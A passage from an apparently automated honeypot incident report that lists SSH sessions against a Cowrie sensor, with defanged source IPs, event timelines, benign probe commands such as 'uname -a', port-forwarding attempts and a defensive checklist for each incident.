| `2026-08-19 19:21:43` | `cowrie.client.version` |
| `2026-08-19 19:21:43` | `cowrie.client.kex` |
| `2026-08-19 19:21:49` | `cowrie.login.success` |
| `2026-08-19 19:21:53` | `cowrie.session.params` |
| `2026-08-19 19:21:53` | `cowrie.command.input` |
| `2026-08-19 19:21:54` | `cowrie.log.closed` |
| `2026-08-19 19:21:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7198601ab057

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 19:26 |
| **Last Seen** | 2026-08-19 19:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:26:19` | `cowrie.session.connect` |
| `2026-08-19 19:26:19` | `cowrie.client.version` |
| `2026-08-19 19:26:19` | `cowrie.client.kex` |
| `2026-08-19 19:26:19` | `cowrie.login.success` |
| `2026-08-19 19:26:20` | `cowrie.session.params` |
| `2026-08-19 19:26:20` | `cowrie.command.input` |
| `2026-08-19 19:26:20` | `cowrie.log.closed` |
| `2026-08-19 19:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-312ecbc53ffa

| Field | Detail |
|---|---|
| **Source IP** | `120.198.138[.]185` |
| **First Seen** | 2026-08-19 19:27 |
| **Last Seen** | 2026-08-19 19:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:27:03` | `cowrie.session.connect` |
| `2026-08-19 19:27:04` | `cowrie.client.version` |
| `2026-08-19 19:27:04` | `cowrie.client.kex` |
| `2026-08-19 19:27:06` | `cowrie.login.success` |
| `2026-08-19 19:27:07` | `cowrie.direct-tcpip.request` |
| `2026-08-19 19:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.198.138[.]185` to AbuseIPDB if not already reported
- [ ] Block `120.198.138[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bbc431a3b6a

| Field | Detail |
|---|---|
| **Source IP** | `169.211.232[.]182` |
| **First Seen** | 2026-08-19 19:27 |
| **Last Seen** | 2026-08-19 19:27 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:27:17` | `cowrie.session.connect` |
| `2026-08-19 19:27:18` | `cowrie.client.version` |
| `2026-08-19 19:27:18` | `cowrie.client.kex` |
| `2026-08-19 19:27:21` | `cowrie.login.success` |
| `2026-08-19 19:27:23` | `cowrie.direct-tcpip.request` |
| `2026-08-19 19:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.232[.]182` to AbuseIPDB if not already reported
- [ ] Block `169.211.232[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0038bfa9d9a

| Field | Detail |
|---|---|
| **Source IP** | `59.11.202[.]38` |
| **First Seen** | 2026-08-19 19:28 |
| **Last Seen** | 2026-08-19 19:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:28:10` | `cowrie.session.connect` |
| `2026-08-19 19:28:11` | `cowrie.client.version` |
| `2026-08-19 19:28:11` | `cowrie.client.kex` |
| `2026-08-19 19:28:14` | `cowrie.login.success` |
| `2026-08-19 19:28:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.11.202[.]38` to AbuseIPDB if not already reported
- [ ] Block `59.11.202[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea527babfbc5

| Field | Detail |
|---|---|
| **Source IP** | `110.25.109[.]54` |
| **First Seen** | 2026-08-19 19:28 |
| **Last Seen** | 2026-08-19 19:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:28:20` | `cowrie.session.connect` |
| `2026-08-19 19:28:21` | `cowrie.client.version` |
| `2026-08-19 19:28:21` | `cowrie.client.kex` |
| `2026-08-19 19:28:23` | `cowrie.login.success` |
| `2026-08-19 19:28:23` | `cowrie.direct-tcpip.request` |
| `2026-08-19 19:28:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.25.109[.]54` to AbuseIPDB if not already reported
- [ ] Block `110.25.109[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b05bdf0bc12

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 19:32 |
| **Last Seen** | 2026-08-19 19:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:32:16` | `cowrie.session.connect` |
| `2026-08-19 19:32:16` | `cowrie.client.version` |
| `2026-08-19 19:32:16` | `cowrie.client.kex` |
| `2026-08-19 19:32:17` | `cowrie.login.success` |
| `2026-08-19 19:32:17` | `cowrie.session.params` |
| `2026-08-19 19:32:17` | `cowrie.command.input` |
| `2026-08-19 19:32:17` | `cowrie.log.closed` |
| `2026-08-19 19:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-784f1484404e

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 19:34 |
| **Last Seen** | 2026-08-19 19:34 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:34:20` | `cowrie.session.connect` |
| `2026-08-19 19:34:21` | `cowrie.client.version` |
| `2026-08-19 19:34:21` | `cowrie.client.kex` |
| `2026-08-19 19:34:27` | `cowrie.login.success` |
| `2026-08-19 19:34:31` | `cowrie.session.params` |
| `2026-08-19 19:34:31` | `cowrie.command.input` |
| `2026-08-19 19:34:33` | `cowrie.log.closed` |
| `2026-08-19 19:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc62f8763e44

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 19:38 |
| **Last Seen** | 2026-08-19 19:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:38:14` | `cowrie.session.connect` |
| `2026-08-19 19:38:14` | `cowrie.client.version` |
| `2026-08-19 19:38:14` | `cowrie.client.kex` |
| `2026-08-19 19:38:14` | `cowrie.login.success` |
| `2026-08-19 19:38:15` | `cowrie.session.params` |
| `2026-08-19 19:38:15` | `cowrie.command.input` |
| `2026-08-19 19:38:15` | `cowrie.log.closed` |
| `2026-08-19 19:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13bfc69a83f4

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-08-19 19:43 |
| **Last Seen** | 2026-08-19 19:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:43:52` | `cowrie.session.connect` |
| `2026-08-19 19:43:53` | `cowrie.client.version` |
| `2026-08-19 19:43:53` | `cowrie.client.kex` |
| `2026-08-19 19:43:55` | `cowrie.login.success` |
| `2026-08-19 19:43:56` | `cowrie.direct-tcpip.request` |
| `2026-08-19 19:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab8751ef9257

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 19:44 |
| **Last Seen** | 2026-08-19 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:44:11` | `cowrie.session.connect` |
| `2026-08-19 19:44:11` | `cowrie.client.version` |
| `2026-08-19 19:44:11` | `cowrie.client.kex` |
| `2026-08-19 19:44:11` | `cowrie.login.success` |
| `2026-08-19 19:44:12` | `cowrie.session.params` |
| `2026-08-19 19:44:12` | `cowrie.command.input` |
| `2026-08-19 19:44:12` | `cowrie.log.closed` |
| `2026-08-19 19:44:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-467a3eeffa63

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 19:46 |
| **Last Seen** | 2026-08-19 19:47 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:46:58` | `cowrie.session.connect` |
| `2026-08-19 19:47:00` | `cowrie.client.version` |
| `2026-08-19 19:47:00` | `cowrie.client.kex` |
| `2026-08-19 19:47:07` | `cowrie.login.success` |
| `2026-08-19 19:47:10` | `cowrie.session.params` |
| `2026-08-19 19:47:10` | `cowrie.command.input` |
| `2026-08-19 19:47:12` | `cowrie.log.closed` |
| `2026-08-19 19:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b01dd223b7ae

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 19:50 |
| **Last Seen** | 2026-08-19 19:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:50:08` | `cowrie.session.connect` |
| `2026-08-19 19:50:08` | `cowrie.client.version` |
| `2026-08-19 19:50:08` | `cowrie.client.kex` |
| `2026-08-19 19:50:08` | `cowrie.login.success` |
| `2026-08-19 19:50:09` | `cowrie.session.params` |
| `2026-08-19 19:50:09` | `cowrie.command.input` |
| `2026-08-19 19:50:09` | `cowrie.log.closed` |
| `2026-08-19 19:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2f932950ee7

| Field | Detail |
|---|---|
| **Source IP** | `116.48.138[.]69` |
| **First Seen** | 2026-08-19 19:54 |
| **Last Seen** | 2026-08-19 19:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:54:01` | `cowrie.session.connect` |
| `2026-08-19 19:54:01` | `cowrie.client.version` |
| `2026-08-19 19:54:01` | `cowrie.client.kex` |
| `2026-08-19 19:54:03` | `cowrie.login.success` |
| `2026-08-19 19:54:04` | `cowrie.direct-tcpip.request` |
| `2026-08-19 19:54:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.138[.]69` to AbuseIPDB if not already reported
- [ ] Block `116.48.138[.]69` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73301ebb24b0

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-08-19 19:54 |
| **Last Seen** | 2026-08-19 19:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:54:10` | `cowrie.session.connect` |
| `2026-08-19 19:54:11` | `cowrie.client.version` |
| `2026-08-19 19:54:11` | `cowrie.client.kex` |
| `2026-08-19 19:54:13` | `cowrie.login.success` |
| `2026-08-19 19:54:14` | `cowrie.direct-tcpip.request` |
| `2026-08-19 19:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23e5e4c63315

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 19:56 |
| **Last Seen** | 2026-08-19 19:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:56:05` | `cowrie.session.connect` |
| `2026-08-19 19:56:05` | `cowrie.client.version` |
| `2026-08-19 19:56:05` | `cowrie.client.kex` |
| `2026-08-19 19:56:05` | `cowrie.login.success` |
| `2026-08-19 19:56:06` | `cowrie.session.params` |
| `2026-08-19 19:56:06` | `cowrie.command.input` |
| `2026-08-19 19:56:06` | `cowrie.log.closed` |
| `2026-08-19 19:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9278aec21b1

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]73` |
| **First Seen** | 2026-08-19 19:59 |
| **Last Seen** | 2026-08-19 19:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:59:13` | `cowrie.session.connect` |
| `2026-08-19 19:59:14` | `cowrie.client.version` |
| `2026-08-19 19:59:14` | `cowrie.client.kex` |
| `2026-08-19 19:59:16` | `cowrie.login.success` |
| `2026-08-19 19:59:17` | `cowrie.direct-tcpip.request` |
| `2026-08-19 19:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]73` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18c2240cdbcd

| Field | Detail |
|---|---|
| **Source IP** | `220.93.167[.]144` |
| **First Seen** | 2026-08-19 19:59 |
| **Last Seen** | 2026-08-19 19:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:59:22` | `cowrie.session.connect` |
| `2026-08-19 19:59:23` | `cowrie.client.version` |
| `2026-08-19 19:59:23` | `cowrie.client.kex` |
| `2026-08-19 19:59:26` | `cowrie.login.success` |
| `2026-08-19 19:59:27` | `cowrie.direct-tcpip.request` |
| `2026-08-19 19:59:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.93.167[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.93.167[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87c75bff750f

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 19:59 |
| **Last Seen** | 2026-08-19 19:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 19:59:38` | `cowrie.session.connect` |
| `2026-08-19 19:59:39` | `cowrie.client.version` |
| `2026-08-19 19:59:39` | `cowrie.client.kex` |
| `2026-08-19 19:59:45` | `cowrie.login.success` |
| `2026-08-19 19:59:49` | `cowrie.session.params` |
| `2026-08-19 19:59:49` | `cowrie.command.input` |
| `2026-08-19 19:59:51` | `cowrie.log.closed` |
| `2026-08-19 19:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66beb97009f6

| Field | Detail |
|---|---|
| **Source IP** | `211.228.114[.]53` |
| **First Seen** | 2026-08-19 20:00 |
| **Last Seen** | 2026-08-19 20:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:00:14` | `cowrie.session.connect` |
| `2026-08-19 20:00:15` | `cowrie.client.version` |
| `2026-08-19 20:00:15` | `cowrie.client.kex` |
| `2026-08-19 20:00:17` | `cowrie.login.success` |
| `2026-08-19 20:00:17` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:00:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.114[.]53` to AbuseIPDB if not already reported
- [ ] Block `211.228.114[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5d02a9ac2de

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-08-19 20:00 |
| **Last Seen** | 2026-08-19 20:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:00:26` | `cowrie.session.connect` |
| `2026-08-19 20:00:27` | `cowrie.client.version` |
| `2026-08-19 20:00:27` | `cowrie.client.kex` |
| `2026-08-19 20:00:29` | `cowrie.login.success` |
| `2026-08-19 20:00:30` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56ba3c04df2e

| Field | Detail |
|---|---|
| **Source IP** | `103.121.27[.]218` |
| **First Seen** | 2026-08-19 20:00 |
| **Last Seen** | 2026-08-19 20:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:00:36` | `cowrie.session.connect` |
| `2026-08-19 20:00:37` | `cowrie.client.version` |
| `2026-08-19 20:00:37` | `cowrie.client.kex` |
| `2026-08-19 20:00:39` | `cowrie.login.success` |
| `2026-08-19 20:00:40` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.121.27[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.121.27[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9462b5d988b8

| Field | Detail |
|---|---|
| **Source IP** | `218.26.205[.]154` |
| **First Seen** | 2026-08-19 20:01 |
| **Last Seen** | 2026-08-19 20:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:01:26` | `cowrie.session.connect` |
| `2026-08-19 20:01:27` | `cowrie.client.version` |
| `2026-08-19 20:01:27` | `cowrie.client.kex` |
| `2026-08-19 20:01:28` | `cowrie.login.success` |
| `2026-08-19 20:01:29` | `cowrie.direct-tcpip.request` |
| `2026-08-19 20:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.26.205[.]154` to AbuseIPDB if not already reported
- [ ] Block `218.26.205[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48bf2a5d71f7

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 20:02 |
| **Last Seen** | 2026-08-19 20:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:02:02` | `cowrie.session.connect` |
| `2026-08-19 20:02:02` | `cowrie.client.version` |
| `2026-08-19 20:02:02` | `cowrie.client.kex` |
| `2026-08-19 20:02:03` | `cowrie.login.success` |
| `2026-08-19 20:02:03` | `cowrie.session.params` |
| `2026-08-19 20:02:03` | `cowrie.command.input` |
| `2026-08-19 20:02:04` | `cowrie.log.closed` |
| `2026-08-19 20:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e56c5bc7d23e

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 20:08 |
| **Last Seen** | 2026-08-19 20:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:08:00` | `cowrie.session.connect` |
| `2026-08-19 20:08:00` | `cowrie.client.version` |
| `2026-08-19 20:08:00` | `cowrie.client.kex` |
| `2026-08-19 20:08:00` | `cowrie.login.success` |
| `2026-08-19 20:08:01` | `cowrie.session.params` |
| `2026-08-19 20:08:01` | `cowrie.command.input` |
| `2026-08-19 20:08:01` | `cowrie.log.closed` |
| `2026-08-19 20:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0f42e994055

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 20:12 |
| **Last Seen** | 2026-08-19 20:12 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 20:12:16` | `cowrie.session.connect` |
| `2026-08-19 20:12:18` | `cowrie.client.version` |
| `2026-08-19 20:12:18` | `cowrie.client.kex` |
| `2026-08-19 20:12:25` | `cowrie.login.success` |
| `2026-08-19 20:12:28` | `cowrie.session.params` |
| `2026-08-19 20:12:28` | `cowrie.command.input` |
| `2026-08-19 20:12:30` | `cowrie.log.closed` |
| `2026-08-19 20:12:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e84ff6b8f63

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 20:13 |
| **Last Seen** | 2026-08-19 20:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
